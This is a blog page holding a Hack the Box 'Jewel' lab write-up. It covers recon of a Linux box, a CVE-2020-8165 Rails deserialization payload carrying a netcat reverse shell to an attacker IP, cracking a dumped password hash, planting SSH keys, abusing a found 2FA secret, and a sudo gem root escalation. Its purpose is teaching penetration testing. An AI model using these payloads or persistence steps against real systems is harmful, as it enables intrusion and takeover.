@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Hack the Box - Jewel - HcKy-sec.io</title><meta name="Description" content="Hack the Box Jewel Write-up"><meta property="og:title" content="Hack the Box - Jewel" />
+<meta property="og:description" content="Hack the Box Jewel Write-up" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hcky-sec.io/jewel/" />
+<meta property="og:image" content="https://hcky-sec.io/jewel/jewel1.jpg"/>
+<meta property="article:published_time" content="2021-02-15T21:29:01+08:00" />
+<meta property="article:modified_time" content="2021-02-15T21:29:01+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hcky-sec.io/jewel/jewel1.jpg"/>
+<meta name="twitter:title" content="Hack the Box - Jewel"/>
+<meta name="twitter:description" content="Hack the Box Jewel Write-up"/>
+<meta name="application-name" content="HcKy-sec">
+<meta name="apple-mobile-web-app-title" content="HcKy-sec"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hcky-sec.io/jewel/" /><link rel="next" href="https://hcky-sec.io/osint-ctf/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Hack the Box - Jewel",
+        "inLanguage": "",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hcky-sec.io\/jewel\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/hcky-sec.io\/jewel\/jewel1.jpg",
+                            "width":  800 ,
+                            "height":  638 
+                        }],"genre": "posts","keywords": "Linux, Web, Git, CVE, HTB","wordcount":  1074 ,
+        "url": "https:\/\/hcky-sec.io\/jewel\/","datePublished": "2021-02-15T21:29:01+08:00","dateModified": "2021-02-15T21:29:01+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/hcky-sec.io\/images\/avatar3.jpeg",
+                    "width":  1284 ,
+                    "height":  1293 
+                }},"author": {
+                "@type": "Person",
+                "name": "HcKy"
+            },"description": "Hack the Box Jewel Write-up"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="HcKy-sec.io"><span class="header-title-pre"><i class=''></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/ctf/" title="CTF"> CTF Competitions </a><a class="menu-item" href="/posts/" title="CTF write-ups"> Write-ups </a><a class="menu-item" href="/categories/documentation/"> Docs </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/" title="About Me"> About </a><a class="menu-item" href="/">  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="search for stuff" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="HcKy-sec.io"><span class="header-title-pre"><i class=''></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="search for stuff" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/ctf/" title="CTF">CTF Competitions</a><a class="menu-item" href="/posts/" title="CTF write-ups">Write-ups</a><a class="menu-item" href="/categories/documentation/" title="">Docs</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="About Me">About</a><a class="menu-item" href="/" title=""></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Hack the Box - Jewel</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>HcKy</a></span>&nbsp;<span class="post-category">included in <a href="/categories/write-ups/"><i class="far fa-folder fa-fw"></i>write-ups</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-02-15">2021-02-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1074 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/jewel/jewel1.jpg"
+        data-srcset="/jewel/jewel1.jpg, /jewel/jewel1.jpg 1.5x, /jewel/jewel1.jpg 2x"
+        data-sizes="auto"
+        alt="/jewel/jewel1.jpg"
+        title="Hack the Box Jewel Write-up" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-overview">1. Overview</a></li>
+    <li><a href="#2-recon">2. Recon</a>
+      <ul>
+        <li><a href="#21-nmap">2.1 Nmap</a></li>
+        <li><a href="#22-websites">2.2 Websites</a>
+          <ul>
+            <li><a href="#221-gitweb">2.2.1 Gitweb</a></li>
+            <li><a href="#222-bl0g">2.2.2 Bl0G!</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#3-exploitation">3. Exploitation</a></li>
+    <li><a href="#4-privilege-escalation">4. Privilege Escalation</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div style="text-align:center">Write-up of Jewel - Difficulty : Medium </div>
+<blockquote>
+<p>Experience is a jewel, and it need be so, for it is often purchased at an infinite rate.</p>
+<p>-William Shakespeare</p>
+</blockquote>
+<h2 id="1-overview">1. Overview</h2>
+<p>Jewel is a Linux box running gitweb as well as a blog site.</p>
+<p>This version of gitweb is running a vulnerable version of Ruby on Rails.</p>
+<p>This CVE allowed for remote code execution (RCE) on the victim box and attain a reverse shell as user Bill.</p>
+<p>A sqldump accessible by the user in the backup folder allowed us to obtain the password hash for Bill.</p>
+<p>Cracking the hash and utilizing Bill&rsquo;s 2FA secret allowed us to break into the root account utilizing the gem command.</p>
+<h2 id="2-recon">2. Recon</h2>
+<h3 id="21-nmap">2.1 Nmap</h3>
+<p>As always we start off running a port scan with nmap and we see that ports 22, 8000, and 8080 are open.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"> nmap -sC -sV -T4 10.10.10.211 
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="nmap.png"
+        data-srcset="/jewel/nmap.png, nmap.png 1.5x, /jewel/nmap.png 2x"
+        data-sizes="auto"
+        alt="/jewel/nmap.png"
+        title="nmap" /></p>
+<p>We can see that SSH is open, Apache is running on 8000, and nginx is running on 8080.</p>
+<h3 id="22-websites">2.2 Websites</h3>
+<h4 id="221-gitweb">2.2.1 Gitweb</h4>
+<p>Next we&rsquo;ll go check out what sites those webservers are hosting.</p>
+<p>If we open our browser and go to 10.10.10.211:8000 we get redirected to <strong>/gitweb/</strong>.
+It looks like there&rsquo;s a project called &ldquo;Bl0G!&rdquo;
+We can view the contents of the project by following the hyperlinks and we come to the gem file which tells us the Rails version is 5.2.2.1.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="rubyversion.png"
+        data-srcset="/jewel/rubyversion.png, rubyversion.png 1.5x, /jewel/rubyversion.png 2x"
+        data-sizes="auto"
+        alt="/jewel/rubyversion.png"
+        title="gem" /></p>
+<p>After some google research we find that this version of Ruby has a vulnerability publicly disclosed as <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-8165" target="_blank" rel="noopener noreffer">CVE-2020-8165</a>.</p>
+<p>Thanks to the PoC on github by <a href="https://github.com/masahiro331/CVE-2020-8165" target="_blank" rel="noopener noreffer">masahiro331</a> we can see what exactly needs to be done to exploit this version of Ruby and get our code running on the box.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ curl &#39;localhost:3000/users?new=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%15%60touch+%2Ftmp%2Frce%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T&#39;
+</code></pre></td></tr></table>
+</div>
+</div><p>Great! So we have a possible exploit, but where are we supposed to put it?
+For that we go check out the other site this box is hosting.</p>
+<h4 id="222-bl0g">2.2.2 Bl0G!</h4>
+<p>So we head on over to 10.10.10:211:8080 in our browser and it brings us to the &ldquo;Bl0G&rdquo; page.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="blog.png"
+        data-srcset="/jewel/blog.png, blog.png 1.5x, /jewel/blog.png 2x"
+        data-sizes="auto"
+        alt="/jewel/blog.png"
+        title="Bl0G!" /></p>
+<p>After some poking around we find we can make a user account and login.
+We&rsquo;re able to read all the posts but don&rsquo;t seem to be able to interact with them in any other way.</p>
+<h2 id="3-exploitation">3. Exploitation</h2>
+<p>Since we already know what exploit we&rsquo;re going to try we can start looking for a place to send it.</p>
+<p>The only text field that we found that was able to be updated was the username field under our profile after we are logged in to the site.</p>
+<p>After opening up Burp Suite and configuring our browser to use it as our proxy we&rsquo;re able to intercept the web traffic between us and the blog.</p>
+<p>When we go to update our username we can edit that request before sending it to the server and insert that PoC script from before replacing code execution section with our reverse shell.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22U%60rm+%2Ftmp%2Ff%3Bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7c%2fbin%2fsh+-i+2%3e%261%7cnc+10.10.14.64+1234+%3e%2Ftmp%2ff%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="burp.png"
+        data-srcset="/jewel/burp.png, burp.png 1.5x, /jewel/burp.png 2x"
+        data-sizes="auto"
+        alt="/jewel/burp.png"
+        title="burp" /></p>
+<p>Before sending this off we need to start our netcat listener with <strong>nc -lvnp 1234</strong>.
+Once that&rsquo;s listening we can send off that request and reload the webpage.</p>
+<p>After the reload we get a connection on our listener as user Bill.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="billshell.png"
+        data-srcset="/jewel/billshell.png, billshell.png 1.5x, /jewel/billshell.png 2x"
+        data-sizes="auto"
+        alt="/jewel/billshell.png"
+        title="shell" /></p>
+<p>This connection is just a simple shell so we can upgrade it using the python pty module.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>First thing to do is a quick list of all files in Bill&rsquo;s home directory and take note of what we see.
+If this write-up was helpful consider leaving some respect on my HTB profile.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="billhome.png"
+        data-srcset="/jewel/billhome.png, billhome.png 1.5x, /jewel/billhome.png 2x"
+        data-sizes="auto"
+        alt="/jewel/billhome.png"
+        title="bill-home" /></p>
+<h2 id="4-privilege-escalation">4. Privilege Escalation</h2>
+<p>We already have a user account but the ultimate goal is to own root.</p>
+<p>After some enumeration in the common directories we find a sqldump in <strong>/var/backups</strong>.
+When we read that file it looks like there&rsquo;s hashes for two different users. So let&rsquo;s grab those:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="sqldumphash.png"
+        data-srcset="/jewel/sqldumphash.png, sqldumphash.png 1.5x, /jewel/sqldumphash.png 2x"
+        data-sizes="auto"
+        alt="/jewel/sqldumphash.png"
+        title="sqldump" /></p>
+<p>If we run <strong>getent passwd</strong> as Bill we can see that Jennifer doesn&rsquo;t appear to be a user on the box.
+With that in mind we can try cracking Bill&rsquo;s hash first and save the other one for later, it might still be useful if it&rsquo;s crackable.</p>
+<p>Once we copy the hash to our host machine we can run John the Ripper against it using the rockyou password list.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo john ./bill.hash --wordlist<span class="o">=</span>/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="john.png"
+        data-srcset="/jewel/john.png, john.png 1.5x, /jewel/john.png 2x"
+        data-sizes="auto"
+        alt="/jewel/john.png"
+        title="john" /></p>
+<p>With Bill&rsquo;s password we attempted to connect via SSH but it seems to still be asking for a SSH key. I looked at Bill&rsquo;s home directory and there was no <strong>.ssh</strong> folder so I ran a quick <strong>ssh-keygen</strong> and echoed my <strong>id_rsa.pub</strong> into the newly created <strong>authorized_keys</strong> file.</p>
+<p>Now that we have Bill&rsquo;s password we can run a <strong>sudo -l</strong> to see if he can run any commands as root.
+After putting in Bill&rsquo;s password the box asks for a 2FA code.  For that we go back to Bill&rsquo;s home directory where we saw that <strong>.google_authenticator</strong> file when we first gained access.</p>
+<p>If we manually input the 2FA secret into the authenticator add-on for Chrome it will give us an authentication code to use.<br>
+Unfortunately for us there still seems to be an error when using it.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="googleauth2.png"
+        data-srcset="/jewel/googleauth2.png, googleauth2.png 1.5x, /jewel/googleauth2.png 2x"
+        data-sizes="auto"
+        alt="/jewel/googleauth2.png"
+        title="error" /></p>
+<p>Clearly the 2FA code didn&rsquo;t work. Since the codes are time based the first thing to look at what the time is set to on Jewel with <strong>timedatectl</strong> as well as our host machine.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="timedate1.png"
+        data-srcset="/jewel/timedate1.png, timedate1.png 1.5x, /jewel/timedate1.png 2x"
+        data-sizes="auto"
+        alt="/jewel/timedate1.png"
+        title="time" /></p>
+<p>Well we&rsquo;re clearly not matching so we&rsquo;ll have to set our time-zone and time to match Jewel for our 2FA codes to work.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">timedatectl set-timezone Europe/London
+
+<span class="k">if</span> the <span class="nb">time</span> is off you may need
+
+timedatectl set-time XX:XX:XX 
+
+to synchronize the <span class="nb">times</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>After we sync our times the 2FA codes work and we can finally run our <strong>sudo -l</strong> commmand.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="sudocorrect.png"
+        data-srcset="/jewel/sudocorrect.png, sudocorrect.png 1.5x, /jewel/sudocorrect.png 2x"
+        data-sizes="auto"
+        alt="/jewel/sudocorrect.png"
+        title="sudo" /></p>
+<p>Looks like Bill can run the <strong>gem</strong> command with sudo.</p>
+<p>Let&rsquo;s head over to <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreffer">GTFObins</a> to see if there&rsquo;s a way to get root with this command.</p>
+<p>Looks like if we run one simple command we can hop over to root. So let&rsquo;s do it.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo gem open -e <span class="s2">&#34;/bin/sh -c /bin/sh&#34;</span> rdoc
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="sudogem.png"
+        data-srcset="/jewel/sudogem.png, sudogem.png 1.5x, /jewel/sudogem.png 2x"
+        data-sizes="auto"
+        alt="/jewel/sudogem.png"
+        title="sudogem" /></p>
+<p>And just like that we have root.</p>
+<p>As usual we can insert our <strong>id_rsa.pub</strong> key into root&rsquo;s <strong>/root/.ssh/authorized_keys</strong> folder to we can get access without having to utilize Bill&rsquo;s user account.</p>
+<h2 id="conclusion">Conclusion</h2>
+<ol>
+<li>Make sure your project documents are locked down and your systems are patched.</li>
+<li>You should never leave password hashes unprotected in an easily accessible location.</li>
+<li>If you&rsquo;re going to utilize 2FA don&rsquo;t keep your 2FA secret in a folder on your computer.</li>
+</ol>
+<br>
+<br>
+<br>
+<div style="text-align:center"><a href="https://www.hackthebox.eu/home/users/profile/190484"><img src="https://www.hackthebox.eu/badge/image/190484"></a></div>
+<div style="text-align:center">If this write-up was helpful consider leaving some respect on my HTB profile.</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-02-15</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/web/">Web</a>,&nbsp;<a href="/tags/git/">Git</a>,&nbsp;<a href="/tags/cve/">CVE</a>,&nbsp;<a href="/tags/htb/">HTB</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/osint-ctf/" class="next" rel="next" title="TraceLabs OSINT CTF">TraceLabs OSINT CTF<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.68.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"id-1":"/home/hcky-sec \u0026nbsp;","id-2":"/home/hcky-sec \u0026nbsp;"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-HESLRD4X4Q', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-HESLRD4X4Q" async></script></body>
+</html>
